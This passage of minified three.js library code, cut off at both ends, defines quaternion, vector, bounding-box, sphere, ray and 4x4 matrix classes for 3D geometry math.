this.constructor().copy(this)}copy(t){this.width=t.width,this.height=t.height,this.depth=t.depth,this.scissor.copy(t.scissor),this.scissorTest=t.scissorTest,this.viewport.copy(t.viewport),this.texture=t.texture.clone(),this.texture.isRenderTargetTexture=!0;const e=Object.assign({},t.texture.image);return this.texture.source=new mo(e),this.depthBuffer=t.depthBuffer,this.stencilBuffer=t.stencilBuffer,t.depthTexture!==null&&(this.depthTexture=t.depthTexture.clone()),this.samples=t.samples,this}dispose(){this.dispatchEvent({type:"dispose"})}}class Tn extends ql{constructor(t=1,e=1,n={}){super(t,e,n),this.isWebGLRenderTarget=!0}}class _o extends Te{constructor(t=null,e=1,n=1,r=1){super(null),this.isDataArrayTexture=!0,this.image={data:t,width:e,height:n,depth:r},this.magFilter=ge,this.minFilter=ge,this.wrapR=Fe,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}class Yl extends Te{constructor(t=null,e=1,n=1,r=1){super(null),this.isData3DTexture=!0,this.image={data:t,width:e,height:n,depth:r},this.magFilter=ge,this.minFilter=ge,this.wrapR=Fe,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}class _i{constructor(t=0,e=0,n=0,r=1){this.isQuaternion=!0,this._x=t,this._y=e,this._z=n,this._w=r}static slerpFlat(t,e,n,r,s,o,a){let l=n[r+0],c=n[r+1],u=n[r+2],h=n[r+3];const p=s[o+0],m=s[o+1],E=s[o+2],x=s[o+3];if(a===0){t[e+0]=l,t[e+1]=c,t[e+2]=u,t[e+3]=h;return}if(a===1){t[e+0]=p,t[e+1]=m,t[e+2]=E,t[e+3]=x;return}if(h!==x||l!==p||c!==m||u!==E){let f=1-a;const d=l*p+c*m+u*E+h*x,g=d>=0?1:-1,_=1-d*d;if(_>Number.EPSILON){const w=Math.sqrt(_),S=Math.atan2(w,d*g);f=Math.sin(f*S)/w,a=Math.sin(a*S)/w}const v=a*g;if(l=l*f+p*v,c=c*f+m*v,u=u*f+E*v,h=h*f+x*v,f===1-a){const w=1/Math.sqrt(l*l+c*c+u*u+h*h);l*=w,c*=w,u*=w,h*=w}}t[e]=l,t[e+1]=c,t[e+2]=u,t[e+3]=h}static multiplyQuaternionsFlat(t,e,n,r,s,o){const a=n[r],l=n[r+1],c=n[r+2],u=n[r+3],h=s[o],p=s[o+1],m=s[o+2],E=s[o+3];return t[e]=a*E+u*h+l*m-c*p,t[e+1]=l*E+u*p+c*h-a*m,t[e+2]=c*E+u*m+a*p-l*h,t[e+3]=u*E-a*h-l*p-c*m,t}get x(){return this._x}set x(t){this._x=t,this._onChangeCallback()}get y(){return this._y}set y(t){this._y=t,this._onChangeCallback()}get z(){return this._z}set z(t){this._z=t,this._onChangeCallback()}get w(){return this._w}set w(t){this._w=t,this._onChangeCallback()}set(t,e,n,r){return this._x=t,this._y=e,this._z=n,this._w=r,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._w)}copy(t){return this._x=t.x,this._y=t.y,this._z=t.z,this._w=t.w,this._onChangeCallback(),this}setFromEuler(t,e=!0){const n=t._x,r=t._y,s=t._z,o=t._order,a=Math.cos,l=Math.sin,c=a(n/2),u=a(r/2),h=a(s/2),p=l(n/2),m=l(r/2),E=l(s/2);switch(o){case"XYZ":this._x=p*u*h+c*m*E,this._y=c*m*h-p*u*E,this._z=c*u*E+p*m*h,this._w=c*u*h-p*m*E;break;case"YXZ":this._x=p*u*h+c*m*E,this._y=c*m*h-p*u*E,this._z=c*u*E-p*m*h,this._w=c*u*h+p*m*E;break;case"ZXY":this._x=p*u*h-c*m*E,this._y=c*m*h+p*u*E,this._z=c*u*E+p*m*h,this._w=c*u*h-p*m*E;break;case"ZYX":this._x=p*u*h-c*m*E,this._y=c*m*h+p*u*E,this._z=c*u*E-p*m*h,this._w=c*u*h+p*m*E;break;case"YZX":this._x=p*u*h+c*m*E,this._y=c*m*h+p*u*E,this._z=c*u*E-p*m*h,this._w=c*u*h-p*m*E;break;case"XZY":this._x=p*u*h-c*m*E,this._y=c*m*h-p*u*E,this._z=c*u*E+p*m*h,this._w=c*u*h+p*m*E;break;default:console.warn("THREE.Quaternion: .setFromEuler() encountered an unknown order: "+o)}return e===!0&&this._onChangeCallback(),this}setFromAxisAngle(t,e){const n=e/2,r=Math.sin(n);return this._x=t.x*r,this._y=t.y*r,this._z=t.z*r,this._w=Math.cos(n),this._onChangeCallback(),this}setFromRotationMatrix(t){const e=t.elements,n=e[0],r=e[4],s=e[8],o=e[1],a=e[5],l=e[9],c=e[2],u=e[6],h=e[10],p=n+a+h;if(p>0){const m=.5/Math.sqrt(p+1);this._w=.25/m,this._x=(u-l)*m,this._y=(s-c)*m,this._z=(o-r)*m}else if(n>a&&n>h){const m=2*Math.sqrt(1+n-a-h);this._w=(u-l)/m,this._x=.25*m,this._y=(r+o)/m,this._z=(s+c)/m}else if(a>h){const m=2*Math.sqrt(1+a-n-h);this._w=(s-c)/m,this._x=(r+o)/m,this._y=.25*m,this._z=(l+u)/m}else{const m=2*Math.sqrt(1+h-n-a);this._w=(o-r)/m,this._x=(s+c)/m,this._y=(l+u)/m,this._z=.25*m}return this._onChangeCallback(),this}setFromUnitVectors(t,e){let n=t.dot(e)+1;return n<Number.EPSILON?(n=0,Math.abs(t.x)>Math.abs(t.z)?(this._x=-t.y,this._y=t.x,this._z=0,this._w=n):(this._x=0,this._y=-t.z,this._z=t.y,this._w=n)):(this._x=t.y*e.z-t.z*e.y,this._y=t.z*e.x-t.x*e.z,this._z=t.x*e.y-t.y*e.x,this._w=n),this.normalize()}angleTo(t){return 2*Math.acos(Math.abs(xe(this.dot(t),-1,1)))}rotateTowards(t,e){const n=this.angleTo(t);if(n===0)return this;const r=Math.min(1,e/n);return this.slerp(t,r),this}identity(){return this.set(0,0,0,1)}invert(){return this.conjugate()}conjugate(){return this._x*=-1,this._y*=-1,this._z*=-1,this._onChangeCallback(),this}dot(t){return this._x*t._x+this._y*t._y+this._z*t._z+this._w*t._w}lengthSq(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w}length(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)}normalize(){let t=this.length();return t===0?(this._x=0,this._y=0,this._z=0,this._w=1):(t=1/t,this._x=this._x*t,this._y=this._y*t,this._z=this._z*t,this._w=this._w*t),this._onChangeCallback(),this}multiply(t){return this.multiplyQuaternions(this,t)}premultiply(t){return this.multiplyQuaternions(t,this)}multiplyQuaternions(t,e){const n=t._x,r=t._y,s=t._z,o=t._w,a=e._x,l=e._y,c=e._z,u=e._w;return this._x=n*u+o*a+r*c-s*l,this._y=r*u+o*l+s*a-n*c,this._z=s*u+o*c+n*l-r*a,this._w=o*u-n*a-r*l-s*c,this._onChangeCallback(),this}slerp(t,e){if(e===0)return this;if(e===1)return this.copy(t);const n=this._x,r=this._y,s=this._z,o=this._w;let a=o*t._w+n*t._x+r*t._y+s*t._z;if(a<0?(this._w=-t._w,this._x=-t._x,this._y=-t._y,this._z=-t._z,a=-a):this.copy(t),a>=1)return this._w=o,this._x=n,this._y=r,this._z=s,this;const l=1-a*a;if(l<=Number.EPSILON){const m=1-e;return this._w=m*o+e*this._w,this._x=m*n+e*this._x,this._y=m*r+e*this._y,this._z=m*s+e*this._z,this.normalize(),this}const c=Math.sqrt(l),u=Math.atan2(c,a),h=Math.sin((1-e)*u)/c,p=Math.sin(e*u)/c;return this._w=o*h+this._w*p,this._x=n*h+this._x*p,this._y=r*h+this._y*p,this._z=s*h+this._z*p,this._onChangeCallback(),this}slerpQuaternions(t,e,n){return this.copy(t).slerp(e,n)}random(){const t=Math.random(),e=Math.sqrt(1-t),n=Math.sqrt(t),r=2*Math.PI*Math.random(),s=2*Math.PI*Math.random();return this.set(e*Math.cos(r),n*Math.sin(s),n*Math.cos(s),e*Math.sin(r))}equals(t){return t._x===this._x&&t._y===this._y&&t._z===this._z&&t._w===this._w}fromArray(t,e=0){return this._x=t[e],this._y=t[e+1],this._z=t[e+2],this._w=t[e+3],this._onChangeCallback(),this}toArray(t=[],e=0){return t[e]=this._x,t[e+1]=this._y,t[e+2]=this._z,t[e+3]=this._w,t}fromBufferAttribute(t,e){return this._x=t.getX(e),this._y=t.getY(e),this._z=t.getZ(e),this._w=t.getW(e),this._onChangeCallback(),this}toJSON(){return this.toArray()}_onChange(t){return this._onChangeCallback=t,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._w}}class L{constructor(t=0,e=0,n=0){L.prototype.isVector3=!0,this.x=t,this.y=e,this.z=n}set(t,e,n){return n===void 0&&(n=this.z),this.x=t,this.y=e,this.z=n,this}setScalar(t){return this.x=t,this.y=t,this.z=t,this}setX(t){return this.x=t,this}setY(t){return this.y=t,this}setZ(t){return this.z=t,this}setComponent(t,e){switch(t){case 0:this.x=e;break;case 1:this.y=e;break;case 2:this.z=e;break;default:throw new Error("index is out of range: "+t)}return this}getComponent(t){switch(t){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+t)}}clone(){return new this.constructor(this.x,this.y,this.z)}copy(t){return this.x=t.x,this.y=t.y,this.z=t.z,this}add(t){return this.x+=t.x,this.y+=t.y,this.z+=t.z,this}addScalar(t){return this.x+=t,this.y+=t,this.z+=t,this}addVectors(t,e){return this.x=t.x+e.x,this.y=t.y+e.y,this.z=t.z+e.z,this}addScaledVector(t,e){return this.x+=t.x*e,this.y+=t.y*e,this.z+=t.z*e,this}sub(t){return this.x-=t.x,this.y-=t.y,this.z-=t.z,this}subScalar(t){return this.x-=t,this.y-=t,this.z-=t,this}subVectors(t,e){return this.x=t.x-e.x,this.y=t.y-e.y,this.z=t.z-e.z,this}multiply(t){return this.x*=t.x,this.y*=t.y,this.z*=t.z,this}multiplyScalar(t){return this.x*=t,this.y*=t,this.z*=t,this}multiplyVectors(t,e){return this.x=t.x*e.x,this.y=t.y*e.y,this.z=t.z*e.z,this}applyEuler(t){return this.applyQuaternion(sa.setFromEuler(t))}applyAxisAngle(t,e){return this.applyQuaternion(sa.setFromAxisAngle(t,e))}applyMatrix3(t){const e=this.x,n=this.y,r=this.z,s=t.elements;return this.x=s[0]*e+s[3]*n+s[6]*r,this.y=s[1]*e+s[4]*n+s[7]*r,this.z=s[2]*e+s[5]*n+s[8]*r,this}applyNormalMatrix(t){return this.applyMatrix3(t).normalize()}applyMatrix4(t){const e=this.x,n=this.y,r=this.z,s=t.elements,o=1/(s[3]*e+s[7]*n+s[11]*r+s[15]);return this.x=(s[0]*e+s[4]*n+s[8]*r+s[12])*o,this.y=(s[1]*e+s[5]*n+s[9]*r+s[13])*o,this.z=(s[2]*e+s[6]*n+s[10]*r+s[14])*o,this}applyQuaternion(t){const e=this.x,n=this.y,r=this.z,s=t.x,o=t.y,a=t.z,l=t.w,c=2*(o*r-a*n),u=2*(a*e-s*r),h=2*(s*n-o*e);return this.x=e+l*c+o*h-a*u,this.y=n+l*u+a*c-s*h,this.z=r+l*h+s*u-o*c,this}project(t){return this.applyMatrix4(t.matrixWorldInverse).applyMatrix4(t.projectionMatrix)}unproject(t){return this.applyMatrix4(t.projectionMatrixInverse).applyMatrix4(t.matrixWorld)}transformDirection(t){const e=this.x,n=this.y,r=this.z,s=t.elements;return this.x=s[0]*e+s[4]*n+s[8]*r,this.y=s[1]*e+s[5]*n+s[9]*r,this.z=s[2]*e+s[6]*n+s[10]*r,this.normalize()}divide(t){return this.x/=t.x,this.y/=t.y,this.z/=t.z,this}divideScalar(t){return this.multiplyScalar(1/t)}min(t){return this.x=Math.min(this.x,t.x),this.y=Math.min(this.y,t.y),this.z=Math.min(this.z,t.z),this}max(t){return this.x=Math.max(this.x,t.x),this.y=Math.max(this.y,t.y),this.z=Math.max(this.z,t.z),this}clamp(t,e){return this.x=Math.max(t.x,Math.min(e.x,this.x)),this.y=Math.max(t.y,Math.min(e.y,this.y)),this.z=Math.max(t.z,Math.min(e.z,this.z)),this}clampScalar(t,e){return this.x=Math.max(t,Math.min(e,this.x)),this.y=Math.max(t,Math.min(e,this.y)),this.z=Math.max(t,Math.min(e,this.z)),this}clampLength(t,e){const n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(t,Math.min(e,n)))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this}dot(t){return this.x*t.x+this.y*t.y+this.z*t.z}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)}normalize(){return this.divideScalar(this.length()||1)}setLength(t){return this.normalize().multiplyScalar(t)}lerp(t,e){return this.x+=(t.x-this.x)*e,this.y+=(t.y-this.y)*e,this.z+=(t.z-this.z)*e,this}lerpVectors(t,e,n){return this.x=t.x+(e.x-t.x)*n,this.y=t.y+(e.y-t.y)*n,this.z=t.z+(e.z-t.z)*n,this}cross(t){return this.crossVectors(this,t)}crossVectors(t,e){const n=t.x,r=t.y,s=t.z,o=e.x,a=e.y,l=e.z;return this.x=r*l-s*a,this.y=s*o-n*l,this.z=n*a-r*o,this}projectOnVector(t){const e=t.lengthSq();if(e===0)return this.set(0,0,0);const n=t.dot(this)/e;return this.copy(t).multiplyScalar(n)}projectOnPlane(t){return yr.copy(this).projectOnVector(t),this.sub(yr)}reflect(t){return this.sub(yr.copy(t).multiplyScalar(2*this.dot(t)))}angleTo(t){const e=Math.sqrt(this.lengthSq()*t.lengthSq());if(e===0)return Math.PI/2;const n=this.dot(t)/e;return Math.acos(xe(n,-1,1))}distanceTo(t){return Math.sqrt(this.distanceToSquared(t))}distanceToSquared(t){const e=this.x-t.x,n=this.y-t.y,r=this.z-t.z;return e*e+n*n+r*r}manhattanDistanceTo(t){return Math.abs(this.x-t.x)+Math.abs(this.y-t.y)+Math.abs(this.z-t.z)}setFromSpherical(t){return this.setFromSphericalCoords(t.radius,t.phi,t.theta)}setFromSphericalCoords(t,e,n){const r=Math.sin(e)*t;return this.x=r*Math.sin(n),this.y=Math.cos(e)*t,this.z=r*Math.cos(n),this}setFromCylindrical(t){return this.setFromCylindricalCoords(t.radius,t.theta,t.y)}setFromCylindricalCoords(t,e,n){return this.x=t*Math.sin(e),this.y=n,this.z=t*Math.cos(e),this}setFromMatrixPosition(t){const e=t.elements;return this.x=e[12],this.y=e[13],this.z=e[14],this}setFromMatrixScale(t){const e=this.setFromMatrixColumn(t,0).length(),n=this.setFromMatrixColumn(t,1).length(),r=this.setFromMatrixColumn(t,2).length();return this.x=e,this.y=n,this.z=r,this}setFromMatrixColumn(t,e){return this.fromArray(t.elements,e*4)}setFromMatrix3Column(t,e){return this.fromArray(t.elements,e*3)}setFromEuler(t){return this.x=t._x,this.y=t._y,this.z=t._z,this}setFromColor(t){return this.x=t.r,this.y=t.g,this.z=t.b,this}equals(t){return t.x===this.x&&t.y===this.y&&t.z===this.z}fromArray(t,e=0){return this.x=t[e],this.y=t[e+1],this.z=t[e+2],this}toArray(t=[],e=0){return t[e]=this.x,t[e+1]=this.y,t[e+2]=this.z,t}fromBufferAttribute(t,e){return this.x=t.getX(e),this.y=t.getY(e),this.z=t.getZ(e),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this}randomDirection(){const t=(Math.random()-.5)*2,e=Math.random()*Math.PI*2,n=Math.sqrt(1-t**2);return this.x=n*Math.cos(e),this.y=n*Math.sin(e),this.z=t,this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z}}const yr=new L,sa=new _i;class Rn{constructor(t=new L(1/0,1/0,1/0),e=new L(-1/0,-1/0,-1/0)){this.isBox3=!0,this.min=t,this.max=e}set(t,e){return this.min.copy(t),this.max.copy(e),this}setFromArray(t){this.makeEmpty();for(let e=0,n=t.length;e<n;e+=3)this.expandByPoint(Le.fromArray(t,e));return this}setFromBufferAttribute(t){this.makeEmpty();for(let e=0,n=t.count;e<n;e++)this.expandByPoint(Le.fromBufferAttribute(t,e));return this}setFromPoints(t){this.makeEmpty();for(let e=0,n=t.length;e<n;e++)this.expandByPoint(t[e]);return this}setFromCenterAndSize(t,e){const n=Le.copy(e).multiplyScalar(.5);return this.min.copy(t).sub(n),this.max.copy(t).add(n),this}setFromObject(t,e=!1){return this.makeEmpty(),this.expandByObject(t,e)}clone(){return new this.constructor().copy(this)}copy(t){return this.min.copy(t.min),this.max.copy(t.max),this}makeEmpty(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this}isEmpty(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z}getCenter(t){return this.isEmpty()?t.set(0,0,0):t.addVectors(this.min,this.max).multiplyScalar(.5)}getSize(t){return this.isEmpty()?t.set(0,0,0):t.subVectors(this.max,this.min)}expandByPoint(t){return this.min.min(t),this.max.max(t),this}expandByVector(t){return this.min.sub(t),this.max.add(t),this}expandByScalar(t){return this.min.addScalar(-t),this.max.addScalar(t),this}expandByObject(t,e=!1){t.updateWorldMatrix(!1,!1);const n=t.geometry;if(n!==void 0){const s=n.getAttribute("position");if(e===!0&&s!==void 0&&t.isInstancedMesh!==!0)for(let o=0,a=s.count;o<a;o++)t.isMesh===!0?t.getVertexPosition(o,Le):Le.fromBufferAttribute(s,o),Le.applyMatrix4(t.matrixWorld),this.expandByPoint(Le);else t.boundingBox!==void 0?(t.boundingBox===null&&t.computeBoundingBox(),Mi.copy(t.boundingBox)):(n.boundingBox===null&&n.computeBoundingBox(),Mi.copy(n.boundingBox)),Mi.applyMatrix4(t.matrixWorld),this.union(Mi)}const r=t.children;for(let s=0,o=r.length;s<o;s++)this.expandByObject(r[s],e);return this}containsPoint(t){return!(t.x<this.min.x||t.x>this.max.x||t.y<this.min.y||t.y>this.max.y||t.z<this.min.z||t.z>this.max.z)}containsBox(t){return this.min.x<=t.min.x&&t.max.x<=this.max.x&&this.min.y<=t.min.y&&t.max.y<=this.max.y&&this.min.z<=t.min.z&&t.max.z<=this.max.z}getParameter(t,e){return e.set((t.x-this.min.x)/(this.max.x-this.min.x),(t.y-this.min.y)/(this.max.y-this.min.y),(t.z-this.min.z)/(this.max.z-this.min.z))}intersectsBox(t){return!(t.max.x<this.min.x||t.min.x>this.max.x||t.max.y<this.min.y||t.min.y>this.max.y||t.max.z<this.min.z||t.min.z>this.max.z)}intersectsSphere(t){return this.clampPoint(t.center,Le),Le.distanceToSquared(t.center)<=t.radius*t.radius}intersectsPlane(t){let e,n;return t.normal.x>0?(e=t.normal.x*this.min.x,n=t.normal.x*this.max.x):(e=t.normal.x*this.max.x,n=t.normal.x*this.min.x),t.normal.y>0?(e+=t.normal.y*this.min.y,n+=t.normal.y*this.max.y):(e+=t.normal.y*this.max.y,n+=t.normal.y*this.min.y),t.normal.z>0?(e+=t.normal.z*this.min.z,n+=t.normal.z*this.max.z):(e+=t.normal.z*this.max.z,n+=t.normal.z*this.min.z),e<=-t.constant&&n>=-t.constant}intersectsTriangle(t){if(this.isEmpty())return!1;this.getCenter(ri),Si.subVectors(this.max,ri),Pn.subVectors(t.a,ri),In.subVectors(t.b,ri),Ln.subVectors(t.c,ri),Je.subVectors(In,Pn),Qe.subVectors(Ln,In),pn.subVectors(Pn,Ln);let e=[0,-Je.z,Je.y,0,-Qe.z,Qe.y,0,-pn.z,pn.y,Je.z,0,-Je.x,Qe.z,0,-Qe.x,pn.z,0,-pn.x,-Je.y,Je.x,0,-Qe.y,Qe.x,0,-pn.y,pn.x,0];return!Mr(e,Pn,In,Ln,Si)||(e=[1,0,0,0,1,0,0,0,1],!Mr(e,Pn,In,Ln,Si))?!1:(bi.crossVectors(Je,Qe),e=[bi.x,bi.y,bi.z],Mr(e,Pn,In,Ln,Si))}clampPoint(t,e){return e.copy(t).clamp(this.min,this.max)}distanceToPoint(t){return this.clampPoint(t,Le).distanceTo(t)}getBoundingSphere(t){return this.isEmpty()?t.makeEmpty():(this.getCenter(t.center),t.radius=this.getSize(Le).length()*.5),t}intersect(t){return this.min.max(t.min),this.max.min(t.max),this.isEmpty()&&this.makeEmpty(),this}union(t){return this.min.min(t.min),this.max.max(t.max),this}applyMatrix4(t){return this.isEmpty()?this:(We[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(t),We[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(t),We[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(t),We[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(t),We[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(t),We[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(t),We[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(t),We[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(t),this.setFromPoints(We),this)}translate(t){return this.min.add(t),this.max.add(t),this}equals(t){return t.min.equals(this.min)&&t.max.equals(this.max)}}const We=[new L,new L,new L,new L,new L,new L,new L,new L],Le=new L,Mi=new Rn,Pn=new L,In=new L,Ln=new L,Je=new L,Qe=new L,pn=new L,ri=new L,Si=new L,bi=new L,fn=new L;function Mr(i,t,e,n,r){for(let s=0,o=i.length-3;s<=o;s+=3){fn.fromArray(i,s);const a=r.x*Math.abs(fn.x)+r.y*Math.abs(fn.y)+r.z*Math.abs(fn.z),l=t.dot(fn),c=e.dot(fn),u=n.dot(fn);if(Math.max(-Math.max(l,c,u),Math.min(l,c,u))>a)return!1}return!0}const jl=new Rn,si=new L,Sr=new L;class ti{constructor(t=new L,e=-1){this.isSphere=!0,this.center=t,this.radius=e}set(t,e){return this.center.copy(t),this.radius=e,this}setFromPoints(t,e){const n=this.center;e!==void 0?n.copy(e):jl.setFromPoints(t).getCenter(n);let r=0;for(let s=0,o=t.length;s<o;s++)r=Math.max(r,n.distanceToSquared(t[s]));return this.radius=Math.sqrt(r),this}copy(t){return this.center.copy(t.center),this.radius=t.radius,this}isEmpty(){return this.radius<0}makeEmpty(){return this.center.set(0,0,0),this.radius=-1,this}containsPoint(t){return t.distanceToSquared(this.center)<=this.radius*this.radius}distanceToPoint(t){return t.distanceTo(this.center)-this.radius}intersectsSphere(t){const e=this.radius+t.radius;return t.center.distanceToSquared(this.center)<=e*e}intersectsBox(t){return t.intersectsSphere(this)}intersectsPlane(t){return Math.abs(t.distanceToPoint(this.center))<=this.radius}clampPoint(t,e){const n=this.center.distanceToSquared(t);return e.copy(t),n>this.radius*this.radius&&(e.sub(this.center).normalize(),e.multiplyScalar(this.radius).add(this.center)),e}getBoundingBox(t){return this.isEmpty()?(t.makeEmpty(),t):(t.set(this.center,this.center),t.expandByScalar(this.radius),t)}applyMatrix4(t){return this.center.applyMatrix4(t),this.radius=this.radius*t.getMaxScaleOnAxis(),this}translate(t){return this.center.add(t),this}expandByPoint(t){if(this.isEmpty())return this.center.copy(t),this.radius=0,this;si.subVectors(t,this.center);const e=si.lengthSq();if(e>this.radius*this.radius){const n=Math.sqrt(e),r=(n-this.radius)*.5;this.center.addScaledVector(si,r/n),this.radius+=r}return this}union(t){return t.isEmpty()?this:this.isEmpty()?(this.copy(t),this):(this.center.equals(t.center)===!0?this.radius=Math.max(this.radius,t.radius):(Sr.subVectors(t.center,this.center).setLength(t.radius),this.expandByPoint(si.copy(t.center).add(Sr)),this.expandByPoint(si.copy(t.center).sub(Sr))),this)}equals(t){return t.center.equals(this.center)&&t.radius===this.radius}clone(){return new this.constructor().copy(this)}}const Xe=new L,br=new L,Ti=new L,tn=new L,Tr=new L,Ai=new L,Ar=new L;class ls{constructor(t=new L,e=new L(0,0,-1)){this.origin=t,this.direction=e}set(t,e){return this.origin.copy(t),this.direction.copy(e),this}copy(t){return this.origin.copy(t.origin),this.direction.copy(t.direction),this}at(t,e){return e.copy(this.origin).addScaledVector(this.direction,t)}lookAt(t){return this.direction.copy(t).sub(this.origin).normalize(),this}recast(t){return this.origin.copy(this.at(t,Xe)),this}closestPointToPoint(t,e){e.subVectors(t,this.origin);const n=e.dot(this.direction);return n<0?e.copy(this.origin):e.copy(this.origin).addScaledVector(this.direction,n)}distanceToPoint(t){return Math.sqrt(this.distanceSqToPoint(t))}distanceSqToPoint(t){const e=Xe.subVectors(t,this.origin).dot(this.direction);return e<0?this.origin.distanceToSquared(t):(Xe.copy(this.origin).addScaledVector(this.direction,e),Xe.distanceToSquared(t))}distanceSqToSegment(t,e,n,r){br.copy(t).add(e).multiplyScalar(.5),Ti.copy(e).sub(t).normalize(),tn.copy(this.origin).sub(br);const s=t.distanceTo(e)*.5,o=-this.direction.dot(Ti),a=tn.dot(this.direction),l=-tn.dot(Ti),c=tn.lengthSq(),u=Math.abs(1-o*o);let h,p,m,E;if(u>0)if(h=o*l-a,p=o*a-l,E=s*u,h>=0)if(p>=-E)if(p<=E){const x=1/u;h*=x,p*=x,m=h*(h+o*p+2*a)+p*(o*h+p+2*l)+c}else p=s,h=Math.max(0,-(o*p+a)),m=-h*h+p*(p+2*l)+c;else p=-s,h=Math.max(0,-(o*p+a)),m=-h*h+p*(p+2*l)+c;else p<=-E?(h=Math.max(0,-(-o*s+a)),p=h>0?-s:Math.min(Math.max(-s,-l),s),m=-h*h+p*(p+2*l)+c):p<=E?(h=0,p=Math.min(Math.max(-s,-l),s),m=p*(p+2*l)+c):(h=Math.max(0,-(o*s+a)),p=h>0?s:Math.min(Math.max(-s,-l),s),m=-h*h+p*(p+2*l)+c);else p=o>0?-s:s,h=Math.max(0,-(o*p+a)),m=-h*h+p*(p+2*l)+c;return n&&n.copy(this.origin).addScaledVector(this.direction,h),r&&r.copy(br).addScaledVector(Ti,p),m}intersectSphere(t,e){Xe.subVectors(t.center,this.origin);const n=Xe.dot(this.direction),r=Xe.dot(Xe)-n*n,s=t.radius*t.radius;if(r>s)return null;const o=Math.sqrt(s-r),a=n-o,l=n+o;return l<0?null:a<0?this.at(l,e):this.at(a,e)}intersectsSphere(t){return this.distanceSqToPoint(t.center)<=t.radius*t.radius}distanceToPlane(t){const e=t.normal.dot(this.direction);if(e===0)return t.distanceToPoint(this.origin)===0?0:null;const n=-(this.origin.dot(t.normal)+t.constant)/e;return n>=0?n:null}intersectPlane(t,e){const n=this.distanceToPlane(t);return n===null?null:this.at(n,e)}intersectsPlane(t){const e=t.distanceToPoint(this.origin);return e===0||t.normal.dot(this.direction)*e<0}intersectBox(t,e){let n,r,s,o,a,l;const c=1/this.direction.x,u=1/this.direction.y,h=1/this.direction.z,p=this.origin;return c>=0?(n=(t.min.x-p.x)*c,r=(t.max.x-p.x)*c):(n=(t.max.x-p.x)*c,r=(t.min.x-p.x)*c),u>=0?(s=(t.min.y-p.y)*u,o=(t.max.y-p.y)*u):(s=(t.max.y-p.y)*u,o=(t.min.y-p.y)*u),n>o||s>r||((s>n||isNaN(n))&&(n=s),(o<r||isNaN(r))&&(r=o),h>=0?(a=(t.min.z-p.z)*h,l=(t.max.z-p.z)*h):(a=(t.max.z-p.z)*h,l=(t.min.z-p.z)*h),n>l||a>r)||((a>n||n!==n)&&(n=a),(l<r||r!==r)&&(r=l),r<0)?null:this.at(n>=0?n:r,e)}intersectsBox(t){return this.intersectBox(t,Xe)!==null}intersectTriangle(t,e,n,r,s){Tr.subVectors(e,t),Ai.subVectors(n,t),Ar.crossVectors(Tr,Ai);let o=this.direction.dot(Ar),a;if(o>0){if(r)return null;a=1}else if(o<0)a=-1,o=-o;else return null;tn.subVectors(this.origin,t);const l=a*this.direction.dot(Ai.crossVectors(tn,Ai));if(l<0)return null;const c=a*this.direction.dot(Tr.cross(tn));if(c<0||l+c>o)return null;const u=-a*tn.dot(Ar);return u<0?null:this.at(u/o,s)}applyMatrix4(t){return this.origin.applyMatrix4(t),this.direction.transformDirection(t),this}equals(t){return t.origin.equals(this.origin)&&t.direction.equals(this.direction)}clone(){return new this.constructor().copy(this)}}class Zt{constructor(t,e,n,r,s,o,a,l,c,u,h,p,m,E,x,f){Zt.prototype.isMatrix4=!0,this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],t!==void 0&&this.set(t,e,n,r,s,o,a,l,c,u,h,p,m,E,x,f)}set(t,e,n,r,s,o,a,l,c,u,h,p,m,E,x,f){const d=this.elements;return d[0]=t,d[4]=e,d[8]=n,d[12]=r,d[1]=s,d[5]=o,d[9]=a,d[13]=l,d[2]=c,d[6]=u,d[10]=h,d[14]=p,d[3]=m,d[7]=E,d[11]=x,d[15]=f,this}identity(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this}clone(){return new Zt().fromArray(this.elements)}copy(t){const e=this.elements,n=t.elements;return e[0]=n[0],e[1]=n[1],e[2]=n[2],e[3]=n[3],e[4]=n[4],e[5]=n[5],e[6]=n[6],e[7]=n[7],e[8]=n[8],e[9]=n[9],e[10]=n[10],e[11]=n[11],e[12]=n[12],e[13]=n[13],e[14]=n[14],e[15]=n[15],this}copyPosition(t){const e=this.elements,n=t.elements;return e[12]=n[12],e[13]=n[13],e[14]=n[14],this}setFromMatrix3(t){const e=t.elements;return this.set(e[0],e[3],e[6],0,e[1],e[4],e[7],0,e[2],e[5],e[8],0,0,0,0,1),this}extractBasis(t,e,n){return t.setFromMatrixColumn(this,0),e.setFromMatrixColumn(this,1),n.setFromMatrixColumn(this,2),this}makeBasis(t,e,n){return 